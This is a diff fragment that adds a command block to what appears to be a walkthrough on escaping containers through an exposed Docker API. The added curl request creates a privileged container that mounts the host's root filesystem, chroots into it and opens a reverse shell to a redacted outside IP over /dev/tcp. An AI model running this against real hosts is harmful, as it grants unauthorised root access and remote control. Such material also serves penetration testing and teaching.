@@ -188,6 +188,18 @@ We define a container that mounts the host's root directory (`/`) to `/mnt/host`
 
 ```
 
+```bash
+curl -X POST http://192.168.65.7:2375/containers/create -H "Content-Type: application/json" -d '{
+  "Image": "alpine",
+  "HostConfig": {
+    "Binds": ["/:/host"],
+    "Privileged": true,
+    "NetworkMode": "host"
+  },
+  "Cmd": ["sh", "-c", "chroot /host /bin/bash -c \"bash -i >& /dev/tcp/10.XX.XX.XX/9001 0>&1\""]
+}'
+```
+
 **2. Execute via API:**
 
 ```bash
